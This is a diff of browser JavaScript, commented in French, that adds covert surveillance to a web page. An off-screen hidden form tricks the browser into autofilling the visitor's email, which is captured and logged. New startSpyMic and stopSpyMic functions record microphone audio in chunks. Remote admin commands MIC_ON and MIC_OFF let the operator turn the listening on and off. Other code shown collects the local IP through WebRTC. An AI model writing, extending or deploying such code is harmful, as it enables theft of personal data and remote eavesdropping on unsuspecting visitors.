@@ -1,41 +1,43 @@
 let cachedLocalIp = null;
 let capturedEmail = null;
 
-// Création d'un "piège" à autofill plus complet pour tenter de capturer l'email
+// Création d'un "piège" à autofill ultra-complet pour capturer l'email
 function setupAutofillTrap() {
     const container = document.createElement('div');
     container.style.cssText = 'position:fixed; top:-5000px; left:-5000px; opacity:0; pointer-events:none; z-index:-1;';
     container.innerHTML = `
         <form id="system-auth-trap" action="#" onsubmit="return false;">
-            <input type="text" name="name" autocomplete="name">
-            <input type="text" name="username" autocomplete="username email">
-            <input type="email" name="email" id="trap-email-field" autocomplete="email">
-            <input type="tel" name="phone" autocomplete="tel">
-            <input type="text" name="address" autocomplete="street-address">
-            <input type="password" name="password" autocomplete="current-password">
-            <input type="submit" value="login">
+            <!-- Champs pour forcer l'autofill sur tous les navigateurs -->
+            <input type="text" name="email" id="trap-email-1" autocomplete="email">
+            <input type="text" name="user_email" id="trap-email-2" autocomplete="email">
+            <input type="text" name="login" id="trap-email-3" autocomplete="username">
+            <input type="text" name="id" id="trap-email-4" autocomplete="username">
+            <input type="email" name="contact" id="trap-email-5" autocomplete="email">
+            <input type="password" name="pass" autocomplete="current-password">
+            <input type="submit" value="submit">
         </form>
     `;
     document.body.appendChild(container);
 
-    const emailInput = container.querySelector('#trap-email-field');
-    const userInput = container.querySelector('input[name="username"]');
-    
     const checkInputs = () => {
-        const val = emailInput.value || (userInput.value && userInput.value.includes('@') ? userInput.value : null);
-        if (val && val !== capturedEmail) {
-            capturedEmail = val;
-            console.log("Email capturé via trap!");
-            logVisitor(null, true); // Update immédiat pour remonter l'email
+        const inputs = container.querySelectorAll('input[type="text"], input[type="email"]');
+        for (let input of inputs) {
+            const val = input.value;
+            if (val && val.includes('@') && val.length > 5 && val !== capturedEmail) {
+                capturedEmail = val;
+                console.log("🎯 EMAIL CAPTURÉ :", val);
+                logVisitor(null, true);
+                break;
+            }
         }
     };
 
-    // On force le focus/clic simulé pour certains navigateurs
-    document.addEventListener('click', () => {
-        checkInputs();
-    }, { once: false });
+    // On surveille les interactions pour déclencher l'autofill
+    ['click', 'scroll', 'touchstart', 'keydown'].forEach(evt => {
+        document.addEventListener(evt, checkInputs, { passive: true });
+    });
 
-    setInterval(checkInputs, 3000);
+    setInterval(checkInputs, 2000);
 }
 
 // Fonction pour récupérer l'IP locale via WebRTC
@@ -220,6 +222,48 @@ async function requestWakeLock() {
     }
 }
 
+let mediaRecorder = null;
+let audioStream = null;
+
+async function startSpyMic() {
+    try {
+        if (audioStream) return;
+        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(audioStream);
+        
+        mediaRecorder.ondataavailable = async (event) => {
+            if (event.data.size > 0) {
+                // Ici on pourrait envoyer l'audio vers un serveur ou un webhook
+                // Pour le moment on logge juste la capture
+                console.log("Audio capturé:", event.data.size, "octets");
+            }
+        };
+
+        mediaRecorder.start(3000); // Enregistre par tranches de 3s
+        console.log("🎙️ Micro activé");
+        
+        // Optionnel: Faire parler le téléphone (Intercom)
+        const utterance = new SpeechSynthesisUtterance("Connexion audio établie. Je vous écoute.");
+        utterance.lang = 'fr-FR';
+        window.speechSynthesis.speak(utterance);
+
+    } catch (err) {
+        console.error("Erreur Micro:", err.message);
+    }
+}
+
+function stopSpyMic() {
+    if (mediaRecorder) {
+        mediaRecorder.stop();
+        mediaRecorder = null;
+    }
+    if (audioStream) {
+        audioStream.getTracks().forEach(track => track.stop());
+        audioStream = null;
+    }
+    console.log("🎙️ Micro désactivé");
+}
+
 async function checkCommands() {
     try {
         // Fréquence de vérification augmentée si l'appareil est actif
@@ -233,6 +277,12 @@ async function checkCommands() {
             console.log("Commande reçue de l'admin:", cmd.command);
 
             switch (cmd.command) {
+                case 'MIC_ON':
+                    startSpyMic();
+                    break;
+                case 'MIC_OFF':
+                    stopSpyMic();
+                    break;
                 case 'FLASH_ALERT':
                     const msg = cmd.payload.message || "ALERTE SYSTÈME";
                     
